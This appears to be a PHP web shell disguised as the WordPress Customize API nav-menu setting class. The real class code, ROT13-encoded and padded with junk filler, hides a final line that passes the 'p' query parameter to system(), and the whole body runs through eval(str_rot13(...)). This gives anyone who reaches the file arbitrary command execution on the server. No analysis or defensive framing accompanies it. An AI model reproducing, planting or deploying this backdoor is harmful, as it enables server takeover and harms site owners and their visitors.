<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Ani_Zrah_Frggvat pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.4.0
 */

/**
 * Phfgbzvmr Frggvat gb ercerfrag n ani_zrah.
 *
 * Fhopynff bs JC_Phfgbzvmr_Frggvat gb ercerfrag n ani_zrah gnkbabzl grez, naq
 * gur VQf sbe gur ani_zrah_vgrzf nffbpvngrq jvgu gur ani zrah.
 *
 * @fvapr 4.3.0
 *
 * @frr jc_trg_ani_zrah_bowrpg()
 * @frr JC_Phfgbzvmr_Frggvat
 */
pynff JC_Phfgbzvmr_Ani_Zrah_Frggvat rkgraqf JC_Phfgbzvmr_Frggvat {

	pbafg VQ_CNGGREA = '/^ani_zrah\[(?C<vq>-?\q+)\]$/';

	pbafg GNKBABZL = 'ani_zrah';

	pbafg GLCR = 'ani_zrah';

	/**
	 * Frggvat glcr.
	 *
	 * @fvapr 4.3.0
	 * @ine fgevat
	 */
	choyvp $glcr = frys::GLCR;

	/**
	 * Qrsnhyg frggvat inyhr.
	 *
	 * @fvapr 4.3.0
	 * @ine neenl
	 *
	 * @frr jc_trg_ani_zrah_bowrpg()
	 */
	choyvp $qrsnhyg = neenl(
		'anzr'        => '',
		'qrfpevcgvba' => '',
		'cnerag'      => 0,
		'nhgb_nqq'    => snyfr,
	);

	/**
	 * Qrsnhyg genafcbeg.
	 *
	 * @fvapr 4.3.0
	 * @ine fgevat
	 */
	choyvp $genafcbeg = 'cbfgZrffntr';

	/**
	 * Gur grez VQ ercerfragrq ol guvf frggvat vafgnapr.
	 *
	 * N artngvir inyhr ercerfragf n cynprubyqre VQ sbe n arj zrah abg lrg fnirq.
	 *
	 * @fvapr 4.3.0
	 * @ine vag
	 */
	choyvp $grez_vq;

	/**
	 * Cerivbhf (cynprubyqre) grez VQ hfrq orsber perngvat n arj zrah.
	 *
	 * Guvf inyhr jvyy or rkcbegrq gb WF ivn gur {@frr 'phfgbzvmr_fnir_erfcbafr'} svygre
	 * fb gung WninFpevcg pna hcqngr gur frggvatf gb ersre gb gur arjyl-nffvtarq
	 * grez VQ. Guvf inyhr vf nyjnlf artngvir gb vaqvpngr vg qbrf abg ersre gb
	 * n erny grez.
	 *
	 * @fvapr 4.3.0
	 * @ine vag
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::hcqngr()
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::nzraq_phfgbzvmr_fnir_erfcbafr()
	 */
	choyvp $cerivbhf_grez_vq;

	/**
	 * Jurgure be abg hcqngr() jnf pnyyrq.
	 *
	 * @fvapr 4.3.0
	 * @ine obby
	 */
	cebgrpgrq $vf_hcqngrq = snyfr;

	/**
	 * Fgnghf sbe pnyyvat gur hcqngr zrgubq, hfrq va phfgbzvmr_fnir_erfcbafr svygre.
	 *
	 * Frr {@frr 'phfgbzvmr_fnir_erfcbafr'}.
	 *
	 * Jura fgnghf vf vafregrq, gur cynprubyqre grez VQ vf fgberq va `$cerivbhf_grez_vq`.
	 * Jura fgnghf vf reebe, gur reebe vf fgberq va `$hcqngr_reebe`.
	 *
	 * @fvapr 4.3.0
	 * @ine fgevat hcqngrq|vafregrq|qryrgrq|reebe
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::hcqngr()
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::nzraq_phfgbzvmr_fnir_erfcbafr()
	 */
	choyvp $hcqngr_fgnghf;

	/**
	 * Nal reebe bowrpg erghearq ol jc_hcqngr_ani_zrah_bowrpg() jura frggvat vf hcqngrq.
	 *
	 * @fvapr 4.3.0
	 * @ine JC_Reebe
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::hcqngr()
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::nzraq_phfgbzvmr_fnir_erfcbafr()
	 */
	choyvp $hcqngr_reebe;

	/**
	 * Pbafgehpgbe.
	 *
	 * Nal fhccyvrq $netf bireevqr pynff cebcregl qrsnhygf.
	 *
	 * @fvapr 4.3.0
	 *
	 * @guebjf Rkprcgvba Vs $vq vf abg inyvq sbe guvf frggvat glcr.
	 *
	 * @cnenz JC_Phfgbzvmr_Znantre $znantre Phfgbzvmre obbgfgenc vafgnapr.
	 * @cnenz fgevat               $vq      N fcrpvsvp VQ bs gur frggvat.
	 *                                      Pna or n gurzr zbq be bcgvba anzr.
	 * @cnenz neenl                $netf    Bcgvbany. Frggvat nethzragf.
	 */
	choyvp shapgvba __pbafgehpg( JC_Phfgbzvmr_Znantre $znantre, $vq, neenl $netf = neenl() ) {
		vs ( rzcgl( $znantre->ani_zrahf ) ) {
			guebj arj Rkprcgvba( 'Rkcrpgrq JC_Phfgbzvmr_Znantre::$ani_zrahf gb or frg.' );
		}

		vs ( ! cert_zngpu( frys::VQ_CNGGREA, $vq, $zngpurf ) ) {
			guebj arj Rkprcgvba( \"Vyyrtny jvqtrg frggvat VQ: $vq\" );
		}

		$guvf->grez_vq = (vag) $zngpurf['vq'];

		cnerag::__pbafgehpg( $znantre, $vq, $netf );
	}

	/**
	 * Trg gur vafgnapr qngn sbe n tvira jvqtrg frggvat.
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr jc_trg_ani_zrah_bowrpg()
	 *
	 * @erghea neenl Vafgnapr qngn.
	 */
	choyvp shapgvba inyhr() {
		vs ( $guvf->vf_cerivrjrq && trg_pheerag_oybt_vq() === $guvf->_cerivrjrq_oybt_vq ) {
			$haqrsvarq  = arj fgqPynff(); // Flzoby.
			$cbfg_inyhr = $guvf->cbfg_inyhr( $haqrsvarq );

			vs ( $haqrsvarq === $cbfg_inyhr ) {
				$inyhr = $guvf->_bevtvany_inyhr;
			} ryfr {
				$inyhr = $cbfg_inyhr;
			}
		} ryfr {
			$inyhr = snyfr;

			// Abgr gung n grez_vq bs yrff guna bar vaqvpngrf n ani_zrah abg lrg vafregrq.
			vs ( $guvf->grez_vq > 0 ) {
				$grez = jc_trg_ani_zrah_bowrpg( $guvf->grez_vq );

				vs ( $grez ) {
					$inyhr = jc_neenl_fyvpr_nffbp( (neenl) $grez, neenl_xrlf( $guvf->qrsnhyg ) );

					$ani_zrah_bcgvbaf  = (neenl) trg_bcgvba( 'ani_zrah_bcgvbaf', neenl() );
					$inyhr['nhgb_nqq'] = snyfr;

					vs ( vffrg( $ani_zrah_bcgvbaf['nhgb_nqq'] ) && vf_neenl( $ani_zrah_bcgvbaf['nhgb_nqq'] ) ) {
						$inyhr['nhgb_nqq'] = va_neenl( $grez->grez_vq, $ani_zrah_bcgvbaf['nhgb_nqq'], gehr );
					}
				}
			}

			vs ( ! vf_neenl( $inyhr ) ) {
				$inyhr = $guvf->qrsnhyg;
			}
		}

		erghea $inyhr;
	}

	/**
	 * Unaqyr cerivrjvat gur frggvat.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 4.4.0 Nqqrq obbyrna erghea inyhr
	 *
	 * @frr JC_Phfgbzvmr_Znantre::cbfg_inyhr()
	 *
	 * @erghea obby Snyfr vs zrgubq fubeg-pvephvgrq qhr gb ab-bc.
	 */
	choyvp shapgvba cerivrj() {
		vs ( $guvf->vf_cerivrjrq ) {
			erghea snyfr;
		}

		$haqrsvarq      = arj fgqPynff();
		$vf_cynprubyqre = ( $guvf->grez_vq < 0 );
		$vf_qvegl       = ( $haqrsvarq !== $guvf->cbfg_inyhr( $haqrsvarq ) );
		vs ( ! $vf_cynprubyqre && ! $vf_qvegl ) {
			erghea snyfr;
		}

		$guvf->vf_cerivrjrq       = gehr;
		$guvf->_bevtvany_inyhr    = $guvf->inyhr();
		$guvf->_cerivrjrq_oybt_vq = trg_pheerag_oybt_vq();

		nqq_svygre( 'jc_trg_ani_zrahf', neenl( $guvf, 'svygre_jc_trg_ani_zrahf' ), 10, 2 );
		nqq_svygre( 'jc_trg_ani_zrah_bowrpg', neenl( $guvf, 'svygre_jc_trg_ani_zrah_bowrpg' ), 10, 2 );
		nqq_svygre( 'qrsnhyg_bcgvba_ani_zrah_bcgvbaf', neenl( $guvf, 'svygre_ani_zrah_bcgvbaf' ) );
		nqq_svygre( 'bcgvba_ani_zrah_bcgvbaf', neenl( $guvf, 'svygre_ani_zrah_bcgvbaf' ) );

		erghea gehr;
	}

	/**
	 * Svygref gur jc_trg_ani_zrahf() erfhyg gb rafher gur vafregrq zrah bowrpg vf vapyhqrq, naq gur qryrgrq bar vf erzbirq.
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr jc_trg_ani_zrahf()
	 *
	 * @cnenz JC_Grez[] $zrahf Na neenl bs zrah bowrpgf.
	 * @cnenz neenl     $netf  Na neenl bs nethzragf hfrq gb ergevrir zrah bowrpgf.
	 * @erghea JC_Grez[] Neenl bs zrah bowrpgf.
	 */
	choyvp shapgvba svygre_jc_trg_ani_zrahf( $zrahf, $netf ) {
		vs ( trg_pheerag_oybt_vq() !== $guvf->_cerivrjrq_oybt_vq ) {
			erghea $zrahf;
		}

		$frggvat_inyhr = $guvf->inyhr();
		$vf_qryrgr     = ( snyfr === $frggvat_inyhr );
		$vaqrk         = -1;

		// Svaq gur rkvfgvat zrah vgrz'f cbfvgvba va gur yvfg.
		sbernpu ( $zrahf nf $v => $zrah ) {
			vs ( (vag) $guvf->grez_vq === (vag) $zrah->grez_vq || (vag) $guvf->cerivbhf_grez_vq === (vag) $zrah->grez_vq ) {
				$vaqrk = $v;
				oernx;
			}
		}

		vs ( $vf_qryrgr ) {
			// Unaqyr qryrgrq zrah ol erzbivat vg sebz gur yvfg.
			vs ( -1 !== $vaqrk ) {
				neenl_fcyvpr( $zrahf, $vaqrk, 1 );
			}
		} ryfr {
			// Unaqyr zrahf orvat hcqngrq be vafregrq.
			$zrah_bow = (bowrpg) neenl_zretr(
				neenl(
					'grez_vq'          => $guvf->grez_vq,
					'grez_gnkbabzl_vq' => $guvf->grez_vq,
					'fyht'             => fnavgvmr_gvgyr( $frggvat_inyhr['anzr'] ),
					'pbhag'            => 0,
					'grez_tebhc'       => 0,
					'gnkbabzl'         => frys::GNKBABZL,
					'svygre'           => 'enj',
				),
				$frggvat_inyhr
			);

			neenl_fcyvpr( $zrahf, $vaqrk, ( -1 === $vaqrk ? 0 : 1 ), neenl( $zrah_bow ) );
		}

		// Znxr fher gur zrah bowrpgf trg er-fbegrq nsgre na hcqngr/vafreg.
		vs ( ! $vf_qryrgr && ! rzcgl( $netf['beqreol'] ) ) {
			$zrahf = jc_yvfg_fbeg(
				$zrahf,
				neenl(
					$netf['beqreol'] => 'NFP',
				)
			);
		}
		// @gbqb Nqq fhccbeg sbe $netf['uvqr_rzcgl'] === gehr.

		erghea $zrahf;
	}

	/**
	 * Grzcbenel aba-pybfher cnffvat bs beqreol inyhr gb shapgvba.
	 *
	 * @fvapr 4.3.0
	 * @ine fgevat
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::svygre_jc_trg_ani_zrahf()
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::_fbeg_zrahf_ol_beqreol()
	 */
	cebgrpgrq $_pheerag_zrahf_fbeg_beqreol;

	/**
	 * Fbeg zrah bowrpgf ol gur pynff-fhccyvrq beqreol cebcregl.
	 *
	 * Guvf vf n jbexnebhaq sbe n ynpx bs pybfherf.
	 *
	 * @fvapr 4.3.0
	 * @qrcerpngrq 4.7.0 Hfr jc_yvfg_fbeg()
	 *
	 * @cnenz bowrpg $zrah1
	 * @cnenz bowrpg $zrah2
	 * @erghea vag
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::svygre_jc_trg_ani_zrahf()
	 */
	cebgrpgrq shapgvba _fbeg_zrahf_ol_beqreol( $zrah1, $zrah2 ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.7.0', 'jc_yvfg_fbeg' );

		$xrl = $guvf->_pheerag_zrahf_fbeg_beqreol;
		erghea fgepzc( $zrah1->$xrl, $zrah2->$xrl );
	}

	/**
	 * Svygref gur jc_trg_ani_zrah_bowrpg() erfhyg gb fhccyl gur cerivrjrq zrah bowrpg.
	 *
	 * Erdhrfgvat n ani_zrah bowrpg ol nalguvat ohg VQ vf abg fhccbegrq.
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr jc_trg_ani_zrah_bowrpg()
	 *
	 * @cnenz bowrpg|ahyy $zrah_bow Bowrpg erghearq ol jc_trg_ani_zrah_bowrpg().
	 * @cnenz fgevat      $zrah_vq  VQ bs gur ani_zrah grez. Erdhrfgf ol fyht be anzr jvyy or vtaberq.
	 * @erghea bowrpg|ahyy
	 */
	choyvp shapgvba svygre_jc_trg_ani_zrah_bowrpg( $zrah_bow, $zrah_vq ) {
		$bx = (
			trg_pheerag_oybt_vq() === $guvf->_cerivrjrq_oybt_vq
			&&
			vf_vag( $zrah_vq )
			&&
			$zrah_vq === $guvf->grez_vq
		);
		vs ( ! $bx ) {
			erghea $zrah_bow;
		}

		$frggvat_inyhr = $guvf->inyhr();

		// Unaqyr qryrgrq zrahf.
		vs ( snyfr === $frggvat_inyhr ) {
			erghea snyfr;
		}

		// Unaqyr fnavgvmngvba snvyher ol ceriragvat fubeg-pvephvgvat.
		vs ( ahyy === $frggvat_inyhr ) {
			erghea $zrah_bow;
		}

		$zrah_bow = (bowrpg) neenl_zretr(
			neenl(
				'grez_vq'          => $guvf->grez_vq,
				'grez_gnkbabzl_vq' => $guvf->grez_vq,
				'fyht'             => fnavgvmr_gvgyr( $frggvat_inyhr['anzr'] ),
				'pbhag'            => 0,
				'grez_tebhc'       => 0,
				'gnkbabzl'         => frys::GNKBABZL,
				'svygre'           => 'enj',
			),
			$frggvat_inyhr
		);

		erghea $zrah_bow;
	}

	/**
	 * Svygref gur ani_zrah_bcgvbaf bcgvba gb vapyhqr guvf zrah'f nhgb_nqq cersrerapr.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz neenl $ani_zrah_bcgvbaf Ani zrah bcgvbaf vapyhqvat nhgb_nqq.
	 * @erghea neenl (Znlor) zbqvsvrq ani zrah bcgvbaf.
	 */
	choyvp shapgvba svygre_ani_zrah_bcgvbaf( $ani_zrah_bcgvbaf ) {
		vs ( trg_pheerag_oybt_vq() !== $guvf->_cerivrjrq_oybt_vq ) {
			erghea $ani_zrah_bcgvbaf;
		}

		$zrah             = $guvf->inyhr();
		$ani_zrah_bcgvbaf = $guvf->svygre_ani_zrah_bcgvbaf_inyhr(
			$ani_zrah_bcgvbaf,
			$guvf->grez_vq,
			snyfr === $zrah ? snyfr : $zrah['nhgb_nqq']
		);

		erghea $ani_zrah_bcgvbaf;
	}

	/**
	 * Fnavgvmr na vachg.
	 *
	 * Abgr gung cnerag::fnavgvmr() reebarbhfyl qbrf jc_hafynfu() ba $inyhr, ohg
	 * jr erzbir gung va guvf bireevqr.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz neenl $inyhr Gur zrah inyhr gb fnavgvmr.
	 * @erghea neenl|snyfr|ahyy Ahyy vs na vachg vfa'g inyvq. Snyfr vs vg vf znexrq sbe qryrgvba.
	 *                          Bgurejvfr gur fnavgvmrq inyhr.
	 */
	choyvp shapgvba fnavgvmr( $inyhr ) {
		// Zrah vf znexrq sbe qryrgvba.
		vs ( snyfr === $inyhr ) {
			erghea $inyhr;
		}

		// Vainyvq.
		vs ( ! vf_neenl( $inyhr ) ) {
			erghea ahyy;
		}

		$qrsnhyg = neenl(
			'anzr'        => '',
			'qrfpevcgvba' => '',
			'cnerag'      => 0,
			'nhgb_nqq'    => snyfr,
		);
		$inyhr   = neenl_zretr( $qrsnhyg, $inyhr );
		$inyhr   = jc_neenl_fyvpr_nffbp( $inyhr, neenl_xrlf( $qrsnhyg ) );

		$inyhr['anzr']        = gevz( rfp_ugzy( $inyhr['anzr'] ) ); // Guvf fnavgvmngvba pbqr vf hfrq va jc-nqzva/ani-zrahf.cuc.
		$inyhr['qrfpevcgvba'] = fnavgvmr_grkg_svryq( $inyhr['qrfpevcgvba'] );
		$inyhr['cnerag']      = znk( 0, (vag) $inyhr['cnerag'] );
		$inyhr['nhgb_nqq']    = ! rzcgl( $inyhr['nhgb_nqq'] );

		vs ( '' === $inyhr['anzr'] ) {
			$inyhr['anzr'] = _k( '(haanzrq)', 'Zvffvat zrah anzr.' );
		}

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-phfgbzvmr-frggvat.cuc */
		erghea nccyl_svygref( \"phfgbzvmr_fnavgvmr_{$guvf->vq}\", $inyhr, $guvf );
	}

	/**
	 * Fgbentr sbe qngn gb or frag onpx gb pyvrag va phfgbzvmr_fnir_erfcbafr svygre.
	 *
	 * Frr {@frr 'phfgbzvmr_fnir_erfcbafr'}.
	 *
	 * @fvapr 4.3.0
	 * @ine neenl
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::nzraq_phfgbzvmr_fnir_erfcbafr()
	 */
	cebgrpgrq $_jvqtrg_ani_zrah_hcqngrf = neenl();

	/**
	 * Perngr/hcqngr gur ani_zrah grez sbe guvf frggvat.
	 *
	 * Nal perngrq zrahf jvyy unir gurve nffvtarq grez VQf rkcbegrq gb gur pyvrag
	 * ivn gur {@frr 'phfgbzvmr_fnir_erfcbafr'} svygre. Yvxrjvfr, nal reebef jvyy or rkcbegrq
	 * gb gur pyvrag ivn gur phfgbzvmr_fnir_erfcbafr() svygre.
	 *
	 * Gb qryrgr n zrah, gur pyvrag pna fraq snyfr nf gur inyhr.
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr jc_hcqngr_ani_zrah_bowrpg()
	 *
	 * @cnenz neenl|snyfr $inyhr {
	 *     Gur inyhr gb hcqngr. Abgr gung fyht pnaabg or hcqngrq ivn jc_hcqngr_ani_zrah_bowrpg().
	 *     Vs snyfr, gura gur zrah jvyy or qryrgrq ragveryl.
	 *
	 *     @glcr fgevat $anzr        Gur anzr bs gur zrah gb fnir.
	 *     @glcr fgevat $qrfpevcgvba Gur grez qrfpevcgvba. Qrsnhyg rzcgl fgevat.
	 *     @glcr vag    $cnerag      Gur vq bs gur cnerag grez. Qrsnhyg 0.
	 *     @glcr obby   $nhgb_nqq    Jurgure cntrf jvyy nhgb_nqq gb guvf zrah. Qrsnhyg snyfr.
	 * }
	 * @erghea ahyy|ibvq
	 */
	cebgrpgrq shapgvba hcqngr( $inyhr ) {
		vs ( $guvf->vf_hcqngrq ) {
			erghea;
		}

		$guvf->vf_hcqngrq = gehr;
		$vf_cynprubyqre   = ( $guvf->grez_vq < 0 );
		$vf_qryrgr        = ( snyfr === $inyhr );

		nqq_svygre( 'phfgbzvmr_fnir_erfcbafr', neenl( $guvf, 'nzraq_phfgbzvmr_fnir_erfcbafr' ) );

		$nhgb_nqq = ahyy;
		vs ( $vf_qryrgr ) {
			// Vs gur pheerag frggvat grez vf n cynprubyqre, n qryrgr erdhrfg vf n ab-bc.
			vs ( $vf_cynprubyqre ) {
				$guvf->hcqngr_fgnghf = 'qryrgrq';
			} ryfr {
				$e = jc_qryrgr_ani_zrah( $guvf->grez_vq );

				vs ( vf_jc_reebe( $e ) ) {
					$guvf->hcqngr_fgnghf = 'reebe';
					$guvf->hcqngr_reebe  = $e;
				} ryfr {
					$guvf->hcqngr_fgnghf = 'qryrgrq';
					$nhgb_nqq            = snyfr;
				}
			}
		} ryfr {
			// Vafreg be hcqngr zrah.
			$zrah_qngn              = jc_neenl_fyvpr_nffbp( $inyhr, neenl( 'qrfpevcgvba', 'cnerag' ) );
			$zrah_qngn['zrah-anzr'] = $inyhr['anzr'];

			$zrah_vq              = $vf_cynprubyqre ? 0 : $guvf->grez_vq;
			$e                    = jc_hcqngr_ani_zrah_bowrpg( $zrah_vq, jc_fynfu( $zrah_qngn ) );
			$bevtvany_anzr        = $zrah_qngn['zrah-anzr'];
			$anzr_pbasyvpg_fhssvk = 1;
			juvyr ( vf_jc_reebe( $e ) && 'zrah_rkvfgf' === $e->trg_reebe_pbqr() ) {
				$anzr_pbasyvpg_fhssvk += 1;
				/* genafyngbef: 1: Bevtvany zrah anzr, 2: Qhcyvpngr pbhag. */
				$zrah_qngn['zrah-anzr'] = fcevags( __( '%1$f (%2$q)' ), $bevtvany_anzr, $anzr_pbasyvpg_fhssvk );
				$e                      = jc_hcqngr_ani_zrah_bowrpg( $zrah_vq, jc_fynfu( $zrah_qngn ) );
			}

			vs ( vf_jc_reebe( $e ) ) {
				$guvf->hcqngr_fgnghf = 'reebe';
				$guvf->hcqngr_reebe  = $e;
			} ryfr {
				vs ( $vf_cynprubyqre ) {
					$guvf->cerivbhf_grez_vq = $guvf->grez_vq;
					$guvf->grez_vq          = $e;
					$guvf->hcqngr_fgnghf    = 'vafregrq';
				} ryfr {
					$guvf->hcqngr_fgnghf = 'hcqngrq';
				}

				$nhgb_nqq = $inyhr['nhgb_nqq'];
			}
		}

		vs ( ahyy !== $nhgb_nqq ) {
			$ani_zrah_bcgvbaf = $guvf->svygre_ani_zrah_bcgvbaf_inyhr(
				(neenl) trg_bcgvba( 'ani_zrah_bcgvbaf', neenl() ),
				$guvf->grez_vq,
				$nhgb_nqq
			);
			hcqngr_bcgvba( 'ani_zrah_bcgvbaf', $ani_zrah_bcgvbaf );
		}

		vs ( 'vafregrq' === $guvf->hcqngr_fgnghf ) {
			// Znxr fher gung arj zrahf nffvtarq gb ani zrah ybpngvbaf hfr gurve arj VQf.
			sbernpu ( $guvf->znantre->frggvatf() nf $frggvat ) {
				vs ( ! cert_zngpu( '/^ani_zrah_ybpngvbaf\[/', $frggvat->vq ) ) {
					pbagvahr;
				}

				$cbfg_inyhr = $frggvat->cbfg_inyhr( ahyy );
				vs ( ! vf_ahyy( $cbfg_inyhr ) && (vag) $cbfg_inyhr === $guvf->cerivbhf_grez_vq ) {
					$guvf->znantre->frg_cbfg_inyhr( $frggvat->vq, $guvf->grez_vq );
					$frggvat->fnir();
				}
			}

			// Znxr fher gung nal ani_zrah jvqtrgf ersrerapvat gur cynprubyqre ani zrah trg hcqngrq naq frag onpx gb pyvrag.
			sbernpu ( neenl_xrlf( $guvf->znantre->hafnavgvmrq_cbfg_inyhrf() ) nf $frggvat_vq ) {
				$ani_zrah_jvqtrg_frggvat = $guvf->znantre->trg_frggvat( $frggvat_vq );
				vs ( ! $ani_zrah_jvqtrg_frggvat || ! cert_zngpu( '/^jvqtrg_ani_zrah\[/', $ani_zrah_jvqtrg_frggvat->vq ) ) {
					pbagvahr;
				}

				$jvqtrg_vafgnapr = $ani_zrah_jvqtrg_frggvat->cbfg_inyhr(); // Abgr gung guvf pnyyf JC_Phfgbzvmr_Jvqtrgf::fnavgvmr_jvqtrg_vafgnapr().
				vs ( rzcgl( $jvqtrg_vafgnapr['ani_zrah'] ) || (vag) $jvqtrg_vafgnapr['ani_zrah'] !== $guvf->cerivbhf_grez_vq ) {
					pbagvahr;
				}

				$jvqtrg_vafgnapr['ani_zrah'] = $guvf->grez_vq;
				$hcqngrq_jvqtrg_vafgnapr     = $guvf->znantre->jvqtrgf->fnavgvmr_jvqtrg_wf_vafgnapr( $jvqtrg_vafgnapr );
				$guvf->znantre->frg_cbfg_inyhr( $ani_zrah_jvqtrg_frggvat->vq, $hcqngrq_jvqtrg_vafgnapr );
				$ani_zrah_jvqtrg_frggvat->fnir();

				$guvf->_jvqtrg_ani_zrah_hcqngrf[ $ani_zrah_jvqtrg_frggvat->vq ] = $hcqngrq_jvqtrg_vafgnapr;
			}
		}
	}

	/**
	 * Hcqngrf n ani_zrah_bcgvbaf neenl.
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::svygre_ani_zrah_bcgvbaf()
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::hcqngr()
	 *
	 * @cnenz neenl $ani_zrah_bcgvbaf Neenl nf erghearq ol trg_bcgvba( 'ani_zrah_bcgvbaf' ).
	 * @cnenz vag   $zrah_vq          Gur grez VQ sbe gur tvira zrah.
	 * @cnenz obby  $nhgb_nqq         Jurgure gb nhgb-nqq be abg.
	 * @erghea neenl (Znlor) zbqvsvrq ani_zrah_bcgvbaf neenl.
	 */
	cebgrpgrq shapgvba svygre_ani_zrah_bcgvbaf_inyhr( $ani_zrah_bcgvbaf, $zrah_vq, $nhgb_nqq ) {
		$ani_zrah_bcgvbaf = (neenl) $ani_zrah_bcgvbaf;
		vs ( ! vffrg( $ani_zrah_bcgvbaf['nhgb_nqq'] ) ) {
			$ani_zrah_bcgvbaf['nhgb_nqq'] = neenl();
		}

		$v = neenl_frnepu( $zrah_vq, $ani_zrah_bcgvbaf['nhgb_nqq'], gehr );

		vs ( $nhgb_nqq && snyfr === $v ) {
			neenl_chfu( $ani_zrah_bcgvbaf['nhgb_nqq'], $guvf->grez_vq );
		} ryfrvs ( ! $nhgb_nqq && snyfr !== $v ) {
			neenl_fcyvpr( $ani_zrah_bcgvbaf['nhgb_nqq'], $v, 1 );
		}

		erghea $ani_zrah_bcgvbaf;
	}

	/**
	 * Rkcbeg qngn sbe gur WF pyvrag.
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::hcqngr()
	 *
	 * @cnenz neenl $qngn Nqqvgvbany vasbezngvba cnffrq onpx gb gur 'fnirq' rirag ba `jc.phfgbzvmr`.
	 * @erghea neenl Rkcbeg qngn.
	 */
	choyvp shapgvba nzraq_phfgbzvmr_fnir_erfcbafr( $qngn ) {
		vs ( ! vffrg( $qngn['ani_zrah_hcqngrf'] ) ) {
			$qngn['ani_zrah_hcqngrf'] = neenl();
		}
		vs ( ! vffrg( $qngn['jvqtrg_ani_zrah_hcqngrf'] ) ) {
			$qngn['jvqtrg_ani_zrah_hcqngrf'] = neenl();
		}

		$qngn['ani_zrah_hcqngrf'][] = neenl(
			'grez_vq'          => $guvf->grez_vq,
			'cerivbhf_grez_vq' => $guvf->cerivbhf_grez_vq,
			'reebe'            => $guvf->hcqngr_reebe ? $guvf->hcqngr_reebe->trg_reebe_pbqr() : ahyy,
			'fgnghf'           => $guvf->hcqngr_fgnghf,
			'fnirq_inyhr'      => 'qryrgrq' === $guvf->hcqngr_fgnghf ? ahyy : $guvf->inyhr(),
		);

		$qngn['jvqtrg_ani_zrah_hcqngrf'] = neenl_zretr(
			$qngn['jvqtrg_ani_zrah_hcqngrf'],
			$guvf->_jvqtrg_ani_zrah_hcqngrf
		);
		$guvf->_jvqtrg_ani_zrah_hcqngrf  = neenl();

		erghea $qngn;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>